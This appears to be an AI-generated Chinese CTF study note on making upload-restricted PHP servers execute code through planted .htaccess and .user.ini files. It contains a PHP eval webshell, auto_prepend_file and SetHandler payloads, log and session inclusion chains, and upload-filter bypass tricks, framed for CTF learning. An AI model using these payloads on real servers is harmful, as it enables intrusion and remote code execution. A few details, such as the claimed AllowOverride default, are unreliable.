---
AIGC:
  ContentProducer: '001191110102MAD55U9H0F10002'
  ContentPropagator: '001191110102MAD55U9H0F10002'
  Label: '1'
  ProduceID: 'f101d68c-657e-4ce1-ae6c-e58e5d34a273'
  PropagateID: 'f101d68c-657e-4ce1-ae6c-e58e5d34a273'
  ReservedCode1: '0dfe8108-0a0e-4962-bbab-af810c18be70'
  ReservedCode2: '0dfe8108-0a0e-4962-bbab-af810c18be70'
---

# CTF Web 知识点补充 — 文件解析配置利用

## 专题：利用 .user.ini / .htaccess 控制服务器文件解析

### 1. 概述

在 CTF 文件上传题目中，当服务器仅允许上传图片格式文件（jpg/png/gif），
但需要让服务器将这些文件以 PHP 方式解析执行时，
可以通过上传服务器配置文件来改变文件解析行为。
常见的两种方式：`.user.ini`（PHP 机制）和 `.htaccess`（Apache 机制）。

### 2. .htaccess —— Apache 目录级配置

#### 2.1 基本原理

`.htaccess` 是 Apache HTTP Server 的分布式配置文件，
放置在某个目录下时，对该目录及其子目录下的所有请求生效。
攻击者上传 `.htaccess` 后，可以让 Apache 将特定后缀文件交给 PHP 模块处理。

#### 2.2 常见利用方式

**方式一：指定后缀以 PHP 解析**

```
AddType application/x-httpd-php .jpg
```

上传此 .htaccess 后，该目录下所有 .jpg 文件都会被当作 PHP 执行。

**方式二：使用 FilesMatch 正则匹配**

```
<FilesMatch "shell">
SetHandler application/x-httpd-php
</FilesMatch>
```

文件名包含 "shell" 的任意后缀文件都会以 PHP 解析。
例如上传 `shell.jpg`，内容为 PHP 代码，即可执行。

**方式三：利用 SetHandler 指定处理器**

```
<FilesMatch "\.png$">
SetHandler application/x-httpd-php
</FilesMatch>
```

所有 .png 文件以 PHP 解析。

**方式四：修改 PHP 解析行为（配合短标签）**

当上传的内容中不能出现 `<?php` 关键字时：

```
php_value engine on
php_flag short_open_tag on
```

配合上传文件内容 `<?=eval($_POST['cmd']);?>` 即可绕过 `<?php` 过滤。

**方式五：auto_prepend_file 自动包含**

```
php_value auto_prepend_file /tmp/sess_test
```

每次执行 PHP 文件前自动包含指定文件，
适合配合文件包含漏洞或者其他方式写入的临时文件。

#### 2.3 利用条件

| 条件 | 说明 |
|------|------|
| Web 服务器 | Apache（nginx 不支持 .htaccess） |
| AllowOverride | Apache 配置中 AllowOverride 不为 None（默认 All） |
| 上传能力 | 能上传 .htaccess 文件到 Web 目录 |
| 后缀检查 | 上传黑名单未过滤 .htaccess |

#### 2.4 CTF 典型场景

题目允许上传文件但过滤了 .php 后缀，仅允许图片格式。
解法：
1. 先上传 .htaccess，内容将 .jpg 以 PHP 解析
2. 再上传 shell.jpg，内容为 PHP 代码
3. 访问 shell.jpg 即执行 PHP 代码

---

### 3. .user.ini —— PHP 用户自定义配置

#### 3.1 基本原理

`.user.ini` 是 PHP 自带的配置机制（自 PHP 5.3.0 引入），
它允许在每个目录下放置一个 `.user.ini` 文件，
其中定义的 PHP 配置项会覆盖全局 `php.ini` 的对应值。

**关键特性**：
- 仅对 PHP CGI/FastCGI 模式生效（大多数现代环境都满足）
- 不依赖 Web 服务器类型（Apache / Nginx 均可）
- 对目录下所有 PHP 文件生效
- 配置项有 `PHP_INI_PERDIR` 和 `PHP_INI_USER` 模式的才可用

#### 3.2 核心利用配置项

| 配置项 | 作用 | 利用场景 |
|--------|------|---------|
| `auto_prepend_file` | 在每个 PHP 文件执行前自动包含指定文件 | 最常用，配合上传的图片马 |
| `auto_append_file` | 在每个 PHP 文件执行后自动包含指定文件 | 同上 |
| `open_basedir` | 限制 PHP 文件访问范围 | 绕过路径限制 |
| `short_open_tag` | 开启短标签 `<?` | 绕过 `<?php` 过滤 |
| `disable_functions` | 覆盖禁用函数列表 | 解除命令执行限制 |
| `session.save_path` | 修改 session 存储路径 | 配合 session 文件利用 |
| `extension_dir` + `extension` | 加载自定义扩展 | 加载恶意 .so |

#### 3.3 经典利用流程

**场景**：题目允许上传图片格式文件，服务器为 Nginx + PHP-FPM。

**Step 1：上传 .user.ini**

文件名：`.user.ini`
内容：
```
auto_prepend_file=shell.jpg
```

含义：该目录下每次执行任何 PHP 文件时，
会先自动包含 `shell.jpg` 的内容。

**Step 2：上传 shell.jpg**

文件内容（PHP 代码）：
```php
<?php eval($_POST['cmd']); ?>
```

**Step 3：触发执行**

访问该目录下任意一个已存在的 PHP 文件（如 `index.php`）：
```
http://target/uploads/index.php
POST: cmd=system('cat /flag');
```

由于 `auto_prepend_file` 的作用，
`shell.jpg` 的内容会在 `index.php` 之前被自动包含并执行。

#### 3.4 利用条件与限制

| 条件 | 说明 |
|------|------|
| PHP 模式 | 必须为 CGI/FastCGI 模式（非 mod_php） |
| 上传能力 | 能上传 .user.ini 到 Web 目录 |
| 触发条件 | 目录下需存在至少一个 PHP 文件（index.php 等） |
| 配置模式 | 目标配置项的 mode 必须为 PERDIR 或 USER |
| 生效延迟 | 默认每 300 秒重新扫描一次（`user_ini.cache_ttl`） |

#### 3.5 .user.ini 与 .htaccess 对比

| 对比项 | .user.ini | .htaccess |
|--------|-----------|-----------|
| 依赖组件 | PHP（CGI/FastCGI） | Apache |
| 适用服务器 | Apache / Nginx 均可 | 仅 Apache |
| 作用范围 | PHP 配置项 | Web 服务器配置 + PHP 配置项 |
| 功能强弱 | 仅限 PHP_INI_PERDIR/USER 配置项 | 可修改解析行为、重写规则等 |
| 生效方式 | 缓存扫描（默认 300 秒延迟） | 即时生效 |
| 上传难易 | 同为隐藏文件，需绕过后缀检查 | 同左 |
| CTF 优先级 | Nginx 环境首选 | Apache 环境首选 |

---

### 4. 进阶技巧与绕过

#### 4.1 上传绕过策略

题目通常会对上传文件做后缀检查，常见的绕过方式：

| 策略 | 说明 |
|------|------|
| 大小写绕过 | `.HTACCESS` / `.User.INI`（部分系统不区分） |
| 后缀嵌套 | `.htaccess.` （Windows 下去掉末尾点） |
| 空格 / 特殊字符 | `.htaccess ` (末尾空格) / `.htaccess::$DATA` (Windows ADS) |
| Content-Type 伪造 | 上传时修改 MIME 为 `image/jpeg` |
| 文件头伪造 | 在配置内容前加上 GIF89a 图片头 |
| 双写绕过 | `.hthaccessp` 中间被过滤后变 `.htaccess` |
| MIME 检查绕过 | .htaccess 和 .user.ini 不需要文件头，但配合 GIF89a 可绕过内容检查 |

#### 4.2 .htaccess 高级利用

**利用 auto_prepend_file 配合日志包含**：
```
php_value auto_prepend_file /var/log/apache2/access.log
```
当无法上传图片马时，可利用 Apache 访问日志中写入的 PHP 代码。

**利用 auto_prepend_file 配合 session 文件**：
```
php_value auto_prepend_file /tmp/sess_XXXX
```
先通过其他方式在 session 文件中写入 PHP 代码，再通过 .htaccess 自动包含。

**利用错误页包含**：
```
ErrorDocument 404 /shell.jpg
```
访问不存在的页面触发 404 时执行 shell.jpg。

**多条件 FilesMatch（精确控制）**：
```
<FilesMatch "^abc\.jpg$">
SetHandler application/x-httpd-php
</FilesMatch>
```
仅对恰好命名为 `abc.jpg` 的文件以 PHP 解析，减少误触发。

#### 4.3 .user.ini 高级利用

**双向包含构造后门**：
```
auto_prepend_file=php://input
```
利用 PHP 流协议配合 auto_prepend_file，POST body 中传入 PHP 代码即可执行。
需要注意 `allow_url_include = On` 的前提条件。

**利用 session.auto_start 配合**：
```
session.auto_start=1
session.save_path=/tmp
```
强制开启 session 自动初始化，配合 session 文件中写入的代码。

#### 4.4 识别服务器环境

CTF 解题时需快速判断服务器环境，选择合适的利用方式：

| 判断方法 | Apache 特征 | Nginx 特征 |
|---------|------------|-----------|
| 响应头 Server | `Apache/2.x` | `nginx/1.x` |
| 响应头 X-Powered-By | `PHP/7.x` | `PHP/7.x` |
| 目录列表样式 | Apache 风格 | Nginx 风格或无 |
| 404 页面 | Apache 默认 404 | Nginx 默认 404 |
| .htaccess 是否生效 | 通常生效 | 返回 404（不处理） |

### 5. CTF 实战速查表

```
┌─────────────────────────────────────────────────┐
│          文件解析控制 — 快速决策树               │
├─────────────────────────────────────────────────┤
│                                                 │
│  能上传任意后缀文件到Web目录？                   │
│    ├── Yes → 上传 .php 直接执行                 │
│    └── No  → 仅允许图片格式                     │
│              │                                  │
│              服务器是 Apache？                   │
│                ├── Yes → 上传 .htaccess          │
│                │        AddType x-httpd-php .jpg │
│                │        再上传 shell.jpg         │
│                │                                 │
│                └── No (Nginx) → 上传 .user.ini   │
│                         auto_prepend_file=x.jpg  │
│                         再上传 x.jpg (PHP代码)   │
│                         访问目录下已有PHP文件     │
│                                                 │
│  .htaccess 被 .user.ini 被过滤？                 │
│    ├── 尝试大小写/空格/双写绕过                  │
│    ├── 利用 .htaccess 配合日志/Session 包含     │
│    └── 考虑其他利用链（反序列化/SSRF等）         │
│                                                 │
└─────────────────────────────────────────────────┘
```

### 6. 相关配置文件清单

| 文件 | 作用域 | 依赖 |
|------|--------|------|
| `.htaccess` | Apache 目录级 | Apache + AllowOverride |
| `.user.ini` | PHP 目录级 | PHP CGI/FastCGI |
| `php.ini` | PHP 全局 | — |
| `httpd.conf` | Apache 全局 | — |
| `nginx.conf` | Nginx 全局 | — |

### 7. 总结

| 知识点 | 核心要点 |
|--------|---------|
| .htaccess | Apache 专用，可修改解析行为，功能最强 |
| .user.ini | PHP 通用，通过 auto_prepend_file 实现代码执行 |
| 利用前提 | 需要能上传配置文件到 Web 目录 |
| 触发执行 | .htaccess 直接修改后缀解析；.user.ini 需目录下有 PHP 文件 |
| 优先选择 | Apache → .htaccess；Nginx → .user.ini |
| 绕过策略 | 大小写、空格、双写、Content-Type 伪造、文件头伪装 |

> AI生成